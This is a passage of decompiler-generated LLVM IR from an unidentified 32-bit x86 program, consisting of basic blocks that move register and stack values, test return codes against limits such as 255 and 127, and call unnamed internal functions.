  %v6_8049bb9 = icmp eq i32 %v1_8049bb9, 0
  store i1 %v6_8049bb9, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049bbc

dec_label_pc_8049bbc:                             ; preds = %dec_label_pc_8049b96, %dec_label_pc_8049b86, %dec_label_pc_8049ba7
  %v0_8049bbc = phi i32 [ %v1_8049b9f, %dec_label_pc_8049b96 ], [ %v1_8049b8f, %dec_label_pc_8049b86 ], [ %v1_8049bb9, %dec_label_pc_8049ba7 ]
  %v0_8049bbf = load i32, i32* @esi, align 4
  store i32 %v0_8049bbf, i32* %eax.global-to-local, align 4
  %v1_8049bc1 = add i32 %v0_8049bbc, 20900
  %v2_8049bc1 = inttoptr i32 %v1_8049bc1 to i32*
  %v3_8049bc1 = load i32, i32* %v2_8049bc1, align 4
  %v2_8049bc8 = add i32 %v0_8049bbf, 1
  %v1_8049bca = add i32 %v2_8049bc8, %v3_8049bc1
  %v8_8049bca = icmp eq i32 %v1_8049bca, 0
  store i1 %v8_8049bca, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bca, i32* %eax.global-to-local, align 4
  %v2_8049bcb = add i32 %v0_8049bbc, -16
  %v3_8049bcb = inttoptr i32 %v2_8049bcb to i32*
  store i32 %v1_8049bca, i32* %v3_8049bcb, align 4
  %v2_8049bcc = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049bcc, i32* @eax, align 4
  %v0_8049bd1 = load i32, i32* @esp, align 4
  %v1_8049bd1 = add i32 %v0_8049bd1, 16
  %v1_8049bd4 = add i32 %v2_8049bcc, -255
  %v6_8049bd4 = sub i32 254, %v2_8049bcc
  %v7_8049bd4 = and i32 %v6_8049bd4, %v2_8049bcc
  %v8_8049bd4 = icmp slt i32 %v7_8049bd4, 0
  %v9_8049bd4 = icmp eq i32 %v1_8049bd4, 0
  store i1 %v9_8049bd4, i1* %zf.global-to-local, align 1
  %v10_8049bd4 = icmp slt i32 %v1_8049bd4, 0
  %v3_8049bd9 = icmp eq i1 %v10_8049bd4, %v8_8049bd4
  %v4_8049bd9 = icmp eq i1 %v9_8049bd4, false
  %v5_8049bd9 = and i1 %v4_8049bd9, %v3_8049bd9
  br i1 %v5_8049bd9, label %dec_label_pc_804949f, label %dec_label_pc_8049bdf

dec_label_pc_8049bdf:                             ; preds = %dec_label_pc_8049bbc
  %v1_8049bdf = add i32 %v0_8049bd1, 92
  %v2_8049bdf = inttoptr i32 %v1_8049bdf to i32*
  %v3_8049bdf = load i32, i32* %v2_8049bdf, align 4
  store i32 %v3_8049bdf, i32* %ebx.global-to-local, align 4
  %v0_8049be3 = load i32, i32* @edi, align 4
  %v2_8049be3 = add i32 %v0_8049bd1, 12
  %v3_8049be3 = inttoptr i32 %v2_8049be3 to i32*
  store i32 %v0_8049be3, i32* %v3_8049be3, align 4
  %v0_8049be4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049be4 = add i32 %v0_8049be4, 533
  %v9_8049be4 = icmp eq i32 %v1_8049be4, 0
  store i1 %v9_8049be4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049be4, i32* @ebx, align 4
  %v0_8049bea = load i32, i32* @edi, align 4
  %v2_8049bea = add i32 %v0_8049bd1, 8
  %v3_8049bea = inttoptr i32 %v2_8049bea to i32*
  store i32 %v0_8049bea, i32* %v3_8049bea, align 4
  %v1_8049beb = add i32 %v0_8049bd1, 4
  %v2_8049beb = inttoptr i32 %v1_8049beb to i32*
  store i32 255, i32* %v2_8049beb, align 4
  %v0_8049bf0 = load i32, i32* @ebx, align 4
  %v3_8049bf0 = inttoptr i32 %v0_8049bd1 to i32*
  store i32 %v0_8049bf0, i32* %v3_8049bf0, align 4
  %v2_8049bf1 = call i32 @function_80526b0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049bf1, i32* %eax.global-to-local, align 4
  %v0_8049bf6 = load i32, i32* @esp, align 4
  %v1_8049bf6 = inttoptr i32 %v0_8049bf6 to i32*
  %v2_8049bf6 = load i32, i32* %v1_8049bf6, align 4
  store i32 %v2_8049bf6, i32* %ecx.global-to-local, align 4
  %v0_8049bf7 = load i32, i32* @esi, align 4
  store i32 %v0_8049bf7, i32* %eax.global-to-local, align 4
  %v1_8049bf9 = add i32 %v0_8049bf6, 20916
  %v2_8049bf9 = inttoptr i32 %v1_8049bf9 to i32*
  %v3_8049bf9 = load i32, i32* %v2_8049bf9, align 4
  store i32 %v3_8049bf9, i32* %edx.global-to-local, align 4
  %v2_8049c00 = add i32 %v0_8049bf7, 1
  %v1_8049c02 = add i32 %v2_8049c00, %v3_8049bf9
  %v8_8049c02 = icmp eq i32 %v1_8049c02, 0
  store i1 %v8_8049c02, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c02, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c02, i32* %v1_8049bf6, align 4
  %v2_8049c04 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049c04, i32* %eax.global-to-local, align 4
  %v0_8049c09 = load i32, i32* @esp, align 4
  %v1_8049c09 = add i32 %v0_8049c09, 16
  %v1_8049c0c = icmp eq i32 %v2_8049c04, 0
  store i1 %v1_8049c0c, i1* %zf.global-to-local, align 1
  %tmp148 = icmp slt i32 %v2_8049c04, 1
  br i1 %tmp148, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049c14:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049bdf
  %v1_8049c14 = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049c09, %dec_label_pc_8049bdf ]
  %v0_8049c14 = phi i32 [ %v2_8049ccd, %dec_label_pc_8049cbd ], [ %v2_8049c04, %dec_label_pc_8049bdf ]
  %v2_8049c14 = add i32 %v1_8049c14, -4
  %v3_8049c14 = inttoptr i32 %v2_8049c14 to i32*
  store i32 %v0_8049c14, i32* %v3_8049c14, align 4
  %v0_8049c15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c15 = add i32 %v1_8049c14, -8
  %v3_8049c15 = inttoptr i32 %v2_8049c15 to i32*
  store i32 %v0_8049c15, i32* %v3_8049c15, align 4
  %v1_8049c16 = add i32 %v1_8049c14, 20900
  %v2_8049c16 = inttoptr i32 %v1_8049c16 to i32*
  %v3_8049c16 = load i32, i32* %v2_8049c16, align 4
  %v0_8049c1d = load i32, i32* @esi, align 4
  %v2_8049c1d = add i32 %v0_8049c1d, %v3_8049c16
  %v12_8049c1d = icmp eq i32 %v2_8049c1d, 0
  store i1 %v12_8049c1d, i1* %zf.global-to-local, align 1
  %v1_8049c1f = add i32 %v2_8049c1d, 1
  store i32 %v1_8049c1f, i32* %eax.global-to-local, align 4
  %v2_8049c22 = add i32 %v1_8049c14, -12
  %v3_8049c22 = inttoptr i32 %v2_8049c22 to i32*
  store i32 %v1_8049c1f, i32* %v3_8049c22, align 4
  %v0_8049c23 = load i32, i32* @ebx, align 4
  %v2_8049c23 = add i32 %v1_8049c14, -16
  %v3_8049c23 = inttoptr i32 %v2_8049c23 to i32*
  store i32 %v0_8049c23, i32* %v3_8049c23, align 4
  %v3_8049c24 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049c24, i32* %eax.global-to-local, align 4
  %v0_8049c29 = load i32, i32* @esp, align 4
  %v1_8049c29 = add i32 %v0_8049c29, 16
  %v6_8049c29 = icmp eq i32 %v1_8049c29, 0
  store i1 %v6_8049c29, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804949f

dec_label_pc_8049c31:                             ; preds = %dec_label_pc_80497f0
  %v1_8049c31 = add i32 %v0_80497e2, 108
  %v2_8049c31 = inttoptr i32 %v1_8049c31 to i32*
  %v3_8049c31 = load i32, i32* %v2_8049c31, align 4
  store i32 %v3_8049c31, i32* %ecx.global-to-local, align 4
  %v1_8049c35 = add i32 %v3_8049c31, -1448
  %v2_8049c35 = inttoptr i32 %v1_8049c35 to i8*
  %v3_8049c35 = load i8, i8* %v2_8049c35, align 1
  %v4_8049c35 = icmp eq i8 %v3_8049c35, 0
  store i1 %v4_8049c35, i1* %zf.global-to-local, align 1
  br i1 %v4_8049c35, label %dec_label_pc_8048d91, label %dec_label_pc_8049c42

dec_label_pc_8049c42:                             ; preds = %dec_label_pc_8049c31
  store i8 1, i8* %v2_8049c35, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049a77
  %v2_8049c4e = add i32 %v0_8049aa9, 12
  %v3_8049c4e = inttoptr i32 %v2_8049c4e to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4e, align 4
  %v2_8049c4f = add i32 %v0_8049aa9, 8
  %v3_8049c4f = inttoptr i32 %v2_8049c4f to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4f, align 4
  %v1_8049c50 = add i32 %v0_8049aa9, 4
  %v2_8049c50 = inttoptr i32 %v1_8049c50 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_80554d4.5 to i32), i32* %v2_8049c50, align 4
  %v0_8049c55 = load i32, i32* @ebx, align 4
  %v3_8049c55 = inttoptr i32 %v0_8049aa9 to i32*
  store i32 %v0_8049c55, i32* %v3_8049c55, align 4
  %v0_8049c56 = call i32 @function_8052990()
  store i32 %v0_8049c56, i32* %eax.global-to-local, align 4
  %v0_8049c5b = load i32, i32* @esp, align 4
  %v3_8049c5e = trunc i32 %v0_8049c56 to i8
  %v4_8049c5e = icmp eq i8 %v3_8049c5e, 0
  store i1 %v4_8049c5e, i1* %zf.global-to-local, align 1
  %v1_8049c60 = icmp eq i1 %v4_8049c5e, false
  br i1 %v1_8049c60, label %dec_label_pc_8049ab4, label %dec_label_pc_8049c66

dec_label_pc_8049c66:                             ; preds = %dec_label_pc_8049c4e
  %v1_8049c66 = add i32 %v0_8049c5b, 120
  %v2_8049c66 = inttoptr i32 %v1_8049c66 to i32*
  %v3_8049c66 = load i32, i32* %v2_8049c66, align 4
  %v4_8049c66 = load i32, i32* @esi, align 4
  %v5_8049c66 = sub i32 %v3_8049c66, %v4_8049c66
  %v11_8049c66 = xor i32 %v4_8049c66, %v3_8049c66
  %v12_8049c66 = xor i32 %v5_8049c66, %v3_8049c66
  %v13_8049c66 = and i32 %v12_8049c66, %v11_8049c66
  %v14_8049c66 = icmp slt i32 %v13_8049c66, 0
  %v15_8049c66 = icmp eq i32 %v5_8049c66, 0
  store i1 %v15_8049c66, i1* %zf.global-to-local, align 1
  %v16_8049c66 = icmp slt i32 %v5_8049c66, 0
  %v1_8049c6a = add i32 %v0_8049c5b, 108
  %v2_8049c6a = inttoptr i32 %v1_8049c6a to i32*
  %v3_8049c6a = load i32, i32* %v2_8049c6a, align 4
  store i32 %v3_8049c6a, i32* %ecx.global-to-local, align 4
  %v3_8049c6e = icmp eq i1 %v16_8049c66, %v14_8049c66
  %v4_8049c6e = icmp eq i1 %v15_8049c66, false
  %v5_8049c6e = and i1 %v4_8049c6e, %v3_8049c6e
  %v6_8049c6e = zext i1 %v5_8049c6e to i32
  %v8_8049c6e = and i32 %v0_8049c56, -256
  %v9_8049c6e = or i32 %v6_8049c6e, %v8_8049c6e
  %v2_8049c71 = mul i32 %v9_8049c6e, 8
  %v3_8049c71 = add nsw i32 %v9_8049c6e, 1
  %v4_8049c71 = add i32 %v3_8049c71, %v2_8049c71
  store i32 %v4_8049c71, i32* %eax.global-to-local, align 4
  %v1_8049c75 = trunc i32 %v4_8049c71 to i8
  %v3_8049c75 = add i32 %v3_8049c6a, -1448
  %v4_8049c75 = inttoptr i32 %v3_8049c75 to i8*
  store i8 %v1_8049c75, i8* %v4_8049c75, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049c80:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5b
  %v0_8049c80 = phi i32 [ %v0_8049b52, %dec_label_pc_8049b5b ], [ %v0_8049b80183, %dec_label_pc_8049b6c ]
  %v1_8049c80 = inttoptr i32 %v0_8049c80 to i8*
  store i8 0, i8* %v1_8049c80, align 1
  br label %dec_label_pc_8049b86

dec_label_pc_8049c88:                             ; preds = %dec_label_pc_8049496
  %v1_8049c88 = add i32 %v0_804948a, 92
  %v2_8049c88 = inttoptr i32 %v1_8049c88 to i32*
  %v3_8049c88 = load i32, i32* %v2_8049c88, align 4
  store i32 %v3_8049c88, i32* %ebx.global-to-local, align 4
  %v0_8049c8c = load i32, i32* @ebp, align 4
  %v2_8049c8c = add i32 %v0_804948a, 12
  %v3_8049c8c = inttoptr i32 %v2_8049c8c to i32*
  store i32 %v0_8049c8c, i32* %v3_8049c8c, align 4
  %v0_8049c8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c8d = add i32 %v0_8049c8d, 533
  %v9_8049c8d = icmp eq i32 %v1_8049c8d, 0
  store i1 %v9_8049c8d, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c8d, i32* @ebx, align 4
  %v0_8049c93 = load i32, i32* @ebp, align 4
  %v2_8049c93 = add i32 %v0_804948a, 8
  %v3_8049c93 = inttoptr i32 %v2_8049c93 to i32*
  store i32 %v0_8049c93, i32* %v3_8049c93, align 4
  %v1_8049c94 = add i32 %v0_804948a, 4
  %v2_8049c94 = inttoptr i32 %v1_8049c94 to i32*
  store i32 255, i32* %v2_8049c94, align 4
  %v0_8049c99 = load i32, i32* @ebx, align 4
  %v3_8049c99 = inttoptr i32 %v0_804948a to i32*
  store i32 %v0_8049c99, i32* %v3_8049c99, align 4
  %v2_8049c9a = call i32 @function_80526b0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049c9a, i32* %eax.global-to-local, align 4
  %v0_8049c9f = load i32, i32* @esp, align 4
  %v1_8049c9f = inttoptr i32 %v0_8049c9f to i32*
  %v2_8049c9f = load i32, i32* %v1_8049c9f, align 4
  store i32 %v2_8049c9f, i32* @edi, align 4
  %v0_8049ca0 = load i32, i32* @esi, align 4
  store i32 %v0_8049ca0, i32* %eax.global-to-local, align 4
  %v1_8049ca2 = add i32 %v0_8049c9f, 20916
  %v2_8049ca2 = inttoptr i32 %v1_8049ca2 to i32*
  %v3_8049ca2 = load i32, i32* %v2_8049ca2, align 4
  store i32 %v3_8049ca2, i32* %ecx.global-to-local, align 4
  %v2_8049ca9 = add i32 %v0_8049ca0, 1
  %v1_8049cab = add i32 %v2_8049ca9, %v3_8049ca2
  %v8_8049cab = icmp eq i32 %v1_8049cab, 0
  store i1 %v8_8049cab, i1* %zf.global-to-local, align 1
  store i32 %v1_8049cab, i32* %eax.global-to-local, align 4
  store i32 %v1_8049cab, i32* %v1_8049c9f, align 4
  %v2_8049cad = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049cad, i32* %eax.global-to-local, align 4
  %v0_8049cb2 = load i32, i32* @esp, align 4
  %v1_8049cb2 = add i32 %v0_8049cb2, 16
  %v1_8049cb5 = icmp eq i32 %v2_8049cad, 0
  store i1 %v1_8049cb5, i1* %zf.global-to-local, align 1
  %tmp149 = icmp slt i32 %v2_8049cad, 1
  br i1 %tmp149, label %dec_label_pc_804949f, label %dec_label_pc_8049cbd

dec_label_pc_8049cbd:                             ; preds = %dec_label_pc_8049c88
  %v0_8049cc0 = load i32, i32* @esi, align 4
  store i32 %v0_8049cc0, i32* %eax.global-to-local, align 4
  %v1_8049cc2 = add i32 %v0_8049cb2, 20916
  %v2_8049cc2 = inttoptr i32 %v1_8049cc2 to i32*
  %v3_8049cc2 = load i32, i32* %v2_8049cc2, align 4
  store i32 %v3_8049cc2, i32* %edx.global-to-local, align 4
  %v2_8049cc9 = add i32 %v0_8049cc0, 1
  %v1_8049ccb = add i32 %v2_8049cc9, %v3_8049cc2
  %v8_8049ccb = icmp eq i32 %v1_8049ccb, 0
  store i1 %v8_8049ccb, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ccb, i32* %eax.global-to-local, align 4
  %v3_8049ccc = inttoptr i32 %v0_8049cb2 to i32*
  store i32 %v1_8049ccb, i32* %v3_8049ccc, align 4
  %v2_8049ccd = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049ccd, i32* %eax.global-to-local, align 4
  %v0_8049cd2 = load i32, i32* @esp, align 4
  %v1_8049cd2 = add i32 %v0_8049cd2, 16
  %v1_8049cd5 = add i32 %v2_8049ccd, -255
  %v6_8049cd5 = sub i32 254, %v2_8049ccd
  %v7_8049cd5 = and i32 %v6_8049cd5, %v2_8049ccd
  %v8_8049cd5 = icmp slt i32 %v7_8049cd5, 0
  %v9_8049cd5 = icmp eq i32 %v1_8049cd5, 0
  store i1 %v9_8049cd5, i1* %zf.global-to-local, align 1
  %v10_8049cd5 = icmp slt i32 %v1_8049cd5, 0
  %v3_8049cda = icmp eq i1 %v10_8049cd5, %v8_8049cd5
  %v4_8049cda = icmp eq i1 %v9_8049cd5, false
  %v5_8049cda = and i1 %v4_8049cda, %v3_8049cda
  br i1 %v5_8049cda, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049ce5:                             ; preds = %dec_label_pc_8049ec7, %dec_label_pc_8049eb6
  %v0_8049ce5 = phi i32 [ %v0_8049eac, %dec_label_pc_8049eb6 ], [ %v0_8049edb207, %dec_label_pc_8049ec7 ]
  %v1_8049ce5 = inttoptr i32 %v0_8049ce5 to i8*
  store i8 0, i8* %v1_8049ce5, align 1
  br label %dec_label_pc_8049ce8

dec_label_pc_8049ce8:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge, %dec_label_pc_8049e86, %dec_label_pc_8049ce5
  %v0_8049ce8 = load i32, i32* @esp, align 4
  %v9_8049ce8 = icmp eq i32 %v0_8049ce8, 12
  store i1 %v9_8049ce8, i1* %zf.global-to-local, align 1
  %v0_8049ceb = load i32, i32* @ebx, align 4
  %v2_8049ceb = add i32 %v0_8049ce8, -16
  %v3_8049ceb = inttoptr i32 %v2_8049ceb to i32*
  store i32 %v0_8049ceb, i32* %v3_8049ceb, align 4
  %v2_8049cec = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049cec, i32* %eax.global-to-local, align 4
  %v0_8049cf1 = load i32, i32* @esp, align 4
  %v1_8049cf1 = add i32 %v0_8049cf1, 16
  %v1_8049cf4 = icmp eq i32 %v2_8049cec, 0
  store i1 %v1_8049cf4, i1* %zf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v2_8049cec, 1
  br i1 %tmp150, label %dec_label_pc_8049d1e, label %dec_label_pc_8049cf8

dec_label_pc_8049cf8:                             ; preds = %dec_label_pc_8049ce8
  %v9_8049cf8 = icmp eq i32 %v0_8049cf1, -4
  store i1 %v9_8049cf8, i1* %zf.global-to-local, align 1
  %v0_8049cfb = load i32, i32* @ebx, align 4
  %v3_8049cfb = inttoptr i32 %v0_8049cf1 to i32*
  store i32 %v0_8049cfb, i32* %v3_8049cfb, align 4
  %v2_8049cfc = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049cfc, i32* %eax.global-to-local, align 4
  %v0_8049d01 = load i32, i32* @esp, align 4
  %v1_8049d01 = add i32 %v0_8049d01, 16
  %v1_8049d04 = add i32 %v2_8049cfc, -127
  %v6_8049d04 = sub i32 126, %v2_8049cfc
  %v7_8049d04 = and i32 %v6_8049d04, %v2_8049cfc
  %v8_8049d04 = icmp slt i32 %v7_8049d04, 0
  %v9_8049d04 = icmp eq i32 %v1_8049d04, 0
  store i1 %v9_8049d04, i1* %zf.global-to-local, align 1
  %v10_8049d04 = icmp slt i32 %v1_8049d04, 0
  %v3_8049d07 = icmp eq i1 %v10_8049d04, %v8_8049d04
  %v4_8049d07 = icmp eq i1 %v9_8049d04, false
  %v5_8049d07 = and i1 %v4_8049d07, %v3_8049d07
  br i1 %v5_8049d07, label %dec_label_pc_8049d1e, label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cf8
  %v2_8049d09 = add i32 %v0_8049d01, 12
  %v3_8049d09 = inttoptr i32 %v2_8049d09 to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d09, align 4
  %v2_8049d0a = add i32 %v0_8049d01, 8
  %v3_8049d0a = inttoptr i32 %v2_8049d0a to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d0a, align 4
  %v0_8049d0b = load i32, i32* @ebx, align 4
  %v2_8049d0b = add i32 %v0_8049d01, 4
  %v3_8049d0b = inttoptr i32 %v2_8049d0b to i32*
  store i32 %v0_8049d0b, i32* %v3_8049d0b, align 4
  %v1_8049d0c = add i32 %v0_8049d01, 92
  %v2_8049d0c = inttoptr i32 %v1_8049d0c to i32*
  %v3_8049d0c = load i32, i32* %v2_8049d0c, align 4
  %v1_8049d10 = add i32 %v3_8049d0c, 789
  %v9_8049d10 = icmp eq i32 %v1_8049d10, 0
  store i1 %v9_8049d10, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d10, i32* %eax.global-to-local, align 4
  %v3_8049d15 = inttoptr i32 %v0_8049d01 to i32*
  store i32 %v1_8049d10, i32* %v3_8049d15, align 4
  %v3_8049d16 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d16, i32* %eax.global-to-local, align 4
  %v0_8049d1b = load i32, i32* @esp, align 4
  %v1_8049d1b = add i32 %v0_8049d1b, 16
  %v6_8049d1b = icmp eq i32 %v1_8049d1b, 0
  store i1 %v6_8049d1b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d1e

dec_label_pc_8049d1e:                             ; preds = %dec_label_pc_8049cf8, %dec_label_pc_8049ce8, %dec_label_pc_8049a40, %dec_label_pc_8049d09
  %v0_8049d1e = phi i32 [ %v1_8049d01, %dec_label_pc_8049cf8 ], [ %v1_8049cf1, %dec_label_pc_8049ce8 ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d1b, %dec_label_pc_8049d09 ]
  %v0_8049d21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d21, i32* %eax.global-to-local, align 4
  %v1_8049d23 = add i32 %v0_8049d1e, 20900
  %v2_8049d23 = inttoptr i32 %v1_8049d23 to i32*
  %v3_8049d23 = load i32, i32* %v2_8049d23, align 4
  store i32 %v3_8049d23, i32* @ebp, align 4
  %v2_8049d2a = add i32 %v0_8049d21, 1
  %v1_8049d2c = add i32 %v2_8049d2a, %v3_8049d23
  %v8_8049d2c = icmp eq i32 %v1_8049d2c, 0
  store i1 %v8_8049d2c, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d2c, i32* %eax.global-to-local, align 4
  %v2_8049d2d = add i32 %v0_8049d1e, -16
  %v3_8049d2d = inttoptr i32 %v2_8049d2d to i32*
  store i32 %v1_8049d2c, i32* %v3_8049d2d, align 4
  %v2_8049d2e = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049d2e, i32* @eax, align 4
  %v0_8049d33 = load i32, i32* @esp, align 4
  %v1_8049d33 = add i32 %v0_8049d33, 16
  %v1_8049d36 = add i32 %v2_8049d2e, -255
  %v6_8049d36 = sub i32 254, %v2_8049d2e
  %v7_8049d36 = and i32 %v6_8049d36, %v2_8049d2e
  %v8_8049d36 = icmp slt i32 %v7_8049d36, 0
  %v9_8049d36 = icmp eq i32 %v1_8049d36, 0
  store i1 %v9_8049d36, i1* %zf.global-to-local, align 1
  %v10_8049d36 = icmp slt i32 %v1_8049d36, 0
  %v3_8049d3b = icmp eq i1 %v10_8049d36, %v8_8049d36
  %v4_8049d3b = icmp eq i1 %v9_8049d36, false
  %v5_8049d3b = and i1 %v4_8049d3b, %v3_8049d3b
  br i1 %v5_8049d3b, label %dec_label_pc_8049a49, label %dec_label_pc_8049d41

dec_label_pc_8049d41:                             ; preds = %dec_label_pc_8049d1e
  %v1_8049d41 = add i32 %v0_8049d33, 92
  %v2_8049d41 = inttoptr i32 %v1_8049d41 to i32*
  %v3_8049d41 = load i32, i32* %v2_8049d41, align 4
  store i32 %v3_8049d41, i32* %esi.global-to-local, align 4
  %v0_8049d45 = load i32, i32* @edi, align 4
  %v2_8049d45 = add i32 %v0_8049d33, 12
  %v3_8049d45 = inttoptr i32 %v2_8049d45 to i32*
  store i32 %v0_8049d45, i32* %v3_8049d45, align 4
  %v0_8049d46 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049d46 = add i32 %v0_8049d46, 533
  %v9_8049d46 = icmp eq i32 %v1_8049d46, 0
  store i1 %v9_8049d46, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d46, i32* @esi, align 4
  %v0_8049d4c = load i32, i32* @edi, align 4
  %v2_8049d4c = add i32 %v0_8049d33, 8
  %v3_8049d4c = inttoptr i32 %v2_8049d4c to i32*
  store i32 %v0_8049d4c, i32* %v3_8049d4c, align 4
  %v1_8049d4d = add i32 %v0_8049d33, 4
  %v2_8049d4d = inttoptr i32 %v1_8049d4d to i32*
  store i32 255, i32* %v2_8049d4d, align 4
  %v0_8049d52 = load i32, i32* @esi, align 4
  %v3_8049d52 = inttoptr i32 %v0_8049d33 to i32*
  store i32 %v0_8049d52, i32* %v3_8049d52, align 4
  %v2_8049d53 = call i32 @function_80526b0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049d53, i32* %eax.global-to-local, align 4
  %v0_8049d58 = load i32, i32* @esp, align 4
  %v1_8049d58 = inttoptr i32 %v0_8049d58 to i32*
  %v2_8049d58 = load i32, i32* %v1_8049d58, align 4
  store i32 %v2_8049d58, i32* %ecx.global-to-local, align 4
  %v0_8049d59 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d59, i32* %eax.global-to-local, align 4
  %v1_8049d5b = add i32 %v0_8049d58, 20916
  %v2_8049d5b = inttoptr i32 %v1_8049d5b to i32*
  %v3_8049d5b = load i32, i32* %v2_8049d5b, align 4
  store i32 %v3_8049d5b, i32* %edx.global-to-local, align 4
  %v2_8049d62 = add i32 %v0_8049d59, 1
  %v1_8049d64 = add i32 %v2_8049d62, %v3_8049d5b
  %v8_8049d64 = icmp eq i32 %v1_8049d64, 0
  store i1 %v8_8049d64, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d64, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d64, i32* %v1_8049d58, align 4
  %v2_8049d66 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049d66, i32* %eax.global-to-local, align 4
  %v0_8049d6b = load i32, i32* @esp, align 4
  %v1_8049d6b = add i32 %v0_8049d6b, 16
  %v1_8049d6e = icmp eq i32 %v2_8049d66, 0
  store i1 %v1_8049d6e, i1* %zf.global-to-local, align 1
  %tmp151 = icmp slt i32 %v2_8049d66, 1
  br i1 %tmp151, label %dec_label_pc_8049a49, label %dec_label_pc_8049d76

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d41
  %v0_8049d76 = load i32, i32* @ebp, align 4
  %v2_8049d76 = add i32 %v0_8049d6b, 12
  %v3_8049d76 = inttoptr i32 %v2_8049d76 to i32*
  store i32 %v0_8049d76, i32* %v3_8049d76, align 4
  %v0_8049d77 = load i32, i32* @ebp, align 4
  %v2_8049d77 = add i32 %v0_8049d6b, 8
  %v3_8049d77 = inttoptr i32 %v2_8049d77 to i32*
  store i32 %v0_8049d77, i32* %v3_8049d77, align 4
  %v1_8049d78 = add i32 %v0_8049d6b, 20916
  %v2_8049d78 = inttoptr i32 %v1_8049d78 to i32*
  %v3_8049d78 = load i32, i32* %v2_8049d78, align 4
  store i32 %v3_8049d78, i32* @edi, align 4
  %v0_8049d7f = load i32, i32* @ebx, align 4
  %v2_8049d7f = add i32 %v0_8049d7f, %v3_8049d78
  %v12_8049d7f = icmp eq i32 %v2_8049d7f, 0
  store i1 %v12_8049d7f, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d7f, i32* @ebx, align 4
  %v1_8049d81 = add i32 %v2_8049d7f, 1
  store i32 %v1_8049d81, i32* %eax.global-to-local, align 4
  %v2_8049d84 = add i32 %v0_8049d6b, 4
  %v3_8049d84 = inttoptr i32 %v2_8049d84 to i32*
  store i32 %v1_8049d81, i32* %v3_8049d84, align 4
  %v0_8049d85 = load i32, i32* @esi, align 4
  %v3_8049d85 = inttoptr i32 %v0_8049d6b to i32*
  store i32 %v0_8049d85, i32* %v3_8049d85, align 4
  %v3_8049d86 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d86, i32* %eax.global-to-local, align 4
  %v0_8049d8b = load i32, i32* @esp, align 4
  %v1_8049d8b = add i32 %v0_8049d8b, 16
  %v6_8049d8b = icmp eq i32 %v1_8049d8b, 0
  store i1 %v6_8049d8b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049a49

dec_label_pc_8049d93:                             ; preds = %dec_label_pc_8049b1d
  %v0_8049d93 = load i32, i32* @esp, align 4
  %v1_8049d93 = add i32 %v0_8049d93, 20900
  %v2_8049d93 = inttoptr i32 %v1_8049d93 to i32*
  store i32 8, i32* %v2_8049d93, align 4
  br label %dec_label_pc_8049b32

dec_label_pc_8049da3:                             ; preds = %dec_label_pc_804965f
  %v9_8049da3 = icmp eq i32 %v0_80496b5, 12
  store i1 %v9_8049da3, i1* %zf.global-to-local, align 1
  %v0_8049da6 = load i32, i32* @edi, align 4
  %v2_8049da6 = add i32 %v0_80496b5, -16
  %v3_8049da6 = inttoptr i32 %v2_8049da6 to i32*
  store i32 %v0_8049da6, i32* %v3_8049da6, align 4
  %v2_8049da7 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049da7, i32* %eax.global-to-local, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
